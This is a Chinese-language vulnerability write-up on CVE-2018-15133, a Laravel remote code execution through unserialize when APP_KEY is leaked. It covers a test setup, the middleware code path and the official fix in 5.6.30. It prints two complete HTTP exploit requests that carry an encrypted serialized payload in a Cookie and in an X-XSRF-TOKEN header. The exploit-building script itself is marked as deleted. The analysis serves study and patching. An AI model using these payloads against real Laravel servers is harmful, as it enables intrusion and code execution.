<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
<div id="app">
<p>本文将记录在 <strong>APP_KEY</strong> 泄露情况下的 <strong>Laravel RCE</strong> 漏洞。该漏洞可以分别在两个地方触发，一个是直接添加在 <strong>cookie</strong> 字段，例如： <strong>Cookie: ATTACK=payload</strong> ；另一处是在 <strong>HTTP Header</strong> 处添加 <strong>X-XSRF-TOKEN</strong> 字段，例如： <strong>X-XSRF-TOKEN: payload</strong> 。漏洞影响版本：5.5.x&lt;=5.5.40、5.6.x&lt;=5.6.29。</p>
<h2 data-content="1" id="bf41fb92a4f7494650c59875feb01cb9">环境搭建</h2>
<p>这里我的测试环境为 <strong>Debian9+apache+PHP7.2+Laravel5.6.29</strong> 。</p>
<div class="highlight"><pre><span></span>➜  html composer create-project laravel/laravel laravel5629 --prefer-dist <span class="s2">"5.6.0"</span>
➜  html <span class="nb">cd</span> laravel5629
➜  laravel5629 sed -i -e <span class="s1">'s/5.6.\*/5.6.29/g'</span> composer.json
➜  laravel5629 composer update
➜  laravel5629 ./artisan key:generate
➜  laravel5629 <span class="nb">echo</span> <span class="s2">"Route::post('/', function() {return view('welcome');});"</span> &gt;&gt; ./routes/web.php
➜  laravel5629 ./artisan serve --host<span class="o">=</span><span class="m">0</span>.0.0.0
</pre></div>
<h2 data-content="1" id="d3d1dfcf92f9b6a589efe76ea37d5b75">漏洞分析</h2>
<p>当接收到 <strong>POST</strong> 数据时，程序在获取 <strong>Illuminate\Http\Response</strong> 类对象时，会依次调用如下 <strong>10个类</strong> 的 <strong>handle</strong> 方法。</p>
<div class="highlight"><pre><span></span><span class="x">App\Http\Middleware\TrustProxies</span>
<span class="x">App\Http\Middleware\CheckForMaintenanceMode</span>
<span class="x">Illuminate\Foundation\Http\Middleware\ValidatePostSize</span>
<span class="x">App\Http\Middleware\TrimStrings</span>
<span class="x">Illuminate\Foundation\Http\Middleware\ConvertEmptyStringsToNull</span>
<span class="x">App\Http\Middleware\EncryptCookies</span>
<span class="x">Illuminate\Cookie\Middleware\AddQueuedCookiesToResponse</span>
<span class="x">Illuminate\Session\Middleware\StartSession</span>
<span class="x">Illuminate\View\Middleware\ShareErrorsFromSession</span>
<span class="x">App\Http\Middleware\VerifyCsrfToken</span>
</pre></div>
<p>而在 <strong>App\Http\Middleware\EncryptCookies</strong> 和 <strong>App\Http\Middleware\VerifyCsrfToken</strong> 两个类的 <strong>handle</strong> 方法中，存在对请求值的合法性校验，并对通过校验的值进行反序列化操作。攻击者可以利用网站泄露的 <strong>APP_KEY</strong> ，结合公开的 <strong>Laravel</strong> 反序列化 <strong>POP</strong> 链进行 <strong>RCE</strong> 。下面，我们来分别看下这两个类的具体代码。</p>
<h3 data-content="1" id="c3712b5d426c4a8095c09851bfba3090">通过Cookie触发RCE</h3>
<p>通过 <strong>Cookie</strong> 触发 <strong>RCE</strong> 的 <strong>EXP</strong> 如下（这里payload中执行的命令是 <code>curl 127.0.0.1:8888</code> ）：</p>
<div class="highlight"><pre><span></span><span class="nf">POST</span> <span class="nn">/</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="o">:</span> <span class="l">0.0.0.0:8000</span>
<span class="na">Cookie</span><span class="o">:</span> <span class="l">XDEBUG_SESSION=PHPSTORM; ATTACK=eyJpdiI6ImRhSTdpRkhWTFowVHNtNDMyZW5wWlE9PSIsInZhbHVlIjoiRHRRRXpRNUhkeG8rQ0s0a21qRmpzUHNkZ0lBaFpsVjlvYk1uZmtwOVpRVFZsdmNKSUhMQnJ0UlBWeHhrbElZb0ZaRnRmMjFlbTNSNXRXZGxCeEF2clNvbk5HT2FDZEEwSGVKU2VuUkFSeVhXTUEwVzFUYlRlc2RsWk1scEg3eWRUKzljRHBWQmEzMERRR0gydG4zYURzWEFcL2djUmFDVGJ5M2NMREVvMDhmeEE0dm5FTVJcL3UwZHBsUjhxajBHbFVBaHVRTWRzN3QwNU9XdWdISWZPaklkXC80alpKQjZEMlJTQjdVXC8wZ3BoNXVXWVFRK1NUSVM5OVhkSXRuSXpHZWRMcUJnR0RwVjlLeDNPUHMyNFpMbWJRPT0iLCJtYWMiOiIxM2M3YThiNmI4MWNkZmI1YjNhMGEzZDRjMDdkYTJiY2MyNzZhOWZkYzUwM2NiOTg1MGRiMTk0ZGU1MjhhOWE1In0=;</span>
<span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded</span>
<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
<span class="na">Content-Length</span><span class="o">:</span> <span class="l">0</span>
</pre></div>
<p><strong>Laravel</strong> 框架在获取 <strong>Illuminate\Http\Response</strong> 类对象时，会循环对 <strong>Cookie</strong> 的值进行解密以验证其合法性。在解密的时候会用到 <strong>APP_KEY</strong> ，如果解密顺利，就会将解密后的值进行反序列化（如下图149行代码）。我们可以看到下图的调试信息中， <strong>$decrypted</strong> 变量已经反序列化成攻击者精心构造的类对象了。继续执行下去，就会触发 <strong>RCE</strong> 。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191011140829-8ba00118-ebed-1.png"/></p>
<h3 data-content="1" id="9a7059949f0ed31ea5cf5267e8b36557">通过HTTP Header触发RCE</h3>
<p>通过 <strong>HTTP Header</strong> 触发 <strong>RCE</strong> 的 <strong>EXP</strong> 如下（这里payload中执行的命令是 <code>curl 127.0.0.1:8888</code> ）：</p>
<div class="highlight"><pre><span></span><span class="nf">POST</span> <span class="nn">/</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="o">:</span> <span class="l">0.0.0.0:8000</span>
<span class="na">Cookie</span><span class="o">:</span> <span class="l">XDEBUG_SESSION=PHPSTORM;</span>
<span class="na">X-XSRF-TOKEN</span><span class="o">:</span> <span class="l">eyJpdiI6ImRhSTdpRkhWTFowVHNtNDMyZW5wWlE9PSIsInZhbHVlIjoiRHRRRXpRNUhkeG8rQ0s0a21qRmpzUHNkZ0lBaFpsVjlvYk1uZmtwOVpRVFZsdmNKSUhMQnJ0UlBWeHhrbElZb0ZaRnRmMjFlbTNSNXRXZGxCeEF2clNvbk5HT2FDZEEwSGVKU2VuUkFSeVhXTUEwVzFUYlRlc2RsWk1scEg3eWRUKzljRHBWQmEzMERRR0gydG4zYURzWEFcL2djUmFDVGJ5M2NMREVvMDhmeEE0dm5FTVJcL3UwZHBsUjhxajBHbFVBaHVRTWRzN3QwNU9XdWdISWZPaklkXC80alpKQjZEMlJTQjdVXC8wZ3BoNXVXWVFRK1NUSVM5OVhkSXRuSXpHZWRMcUJnR0RwVjlLeDNPUHMyNFpMbWJRPT0iLCJtYWMiOiIxM2M3YThiNmI4MWNkZmI1YjNhMGEzZDRjMDdkYTJiY2MyNzZhOWZkYzUwM2NiOTg1MGRiMTk0ZGU1MjhhOWE1In0=;</span>
<span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded</span>
<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
<span class="na">Content-Length</span><span class="o">:</span> <span class="l">0</span>
</pre></div>
<p><strong>Laravel</strong> 框架在获取 <strong>Illuminate\Http\Response</strong> 类对象时，还会获取 <strong>CSRF token</strong> 。如果没有获取到 <strong>CSRF token</strong> ，就会转而获取 <strong>X-XSRF-TOKEN</strong> ，并在校验通过后对其进行反序列化操作。其校验使用的解密代码和上面一致，都是通过 <strong>Illuminate\Encryption\Encrypter</strong> 类的 <strong>decrypt</strong> 方法完成的，这里就不在赘述。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191011140838-911a333e-ebed-1.png"/></p>
<h2 data-content="1" id="a6b4cf85af4584f3621fa3fed73b0cbe">EXP构造</h2>
<p>现在我们看看如何构造 <strong>EXP</strong> ，其实加密函数也在 <strong>Illuminate\Encryption\Encrypter</strong> 类中，其具体代码在 <strong>encrypt</strong> 方法中。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191011140844-949153d0-ebed-1.png"/></p>
<p>我们只需要将其直接拿出来，稍加修改即可利用， <strong>EXP</strong> 脚本如下：</p>
<div class="highlight"><pre><span></span><span class="x">已删除</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191011140849-97940636-ebed-1.png"/></p>
<h2 data-content="1" id="f6f439625b36a6072a6be041ac48f4b6">修复</h2>
<p>最后，我们再来看一下官方的修复代码。如下图所示，在 <strong>Laravel5.6.30</strong> 的代码中，对于 <strong>Cookie</strong> 的解析，多传了一个 <strong>static::serialized()</strong> 值来禁止反序列化操作。同样，对于 <strong>X-XSRF-TOKEN</strong> 头的解析也是同样的处理，这里就不再贴代码了。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191011140857-9c88a822-ebed-1.png"/></p>
<h2 data-content="1" id="5225071d0a38fcf4748622cf05e5fde8">参考</h2>
<p><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-15133" target="_blank">CVE-2018-15133</a></p>
<p><a href="https://laravel.com/docs/5.6/upgrade#upgrade-5.6.30" target="_blank">Laravel5.6.30升级公告</a></p>
<p><a href="https://github.com/kozmic/laravel-poc-CVE-2018-15133" target="_blank">Laravel Remote Code Execution when APP_KEY is leaked PoC (CVE-2018-15133)</a></p>
</div>
</div>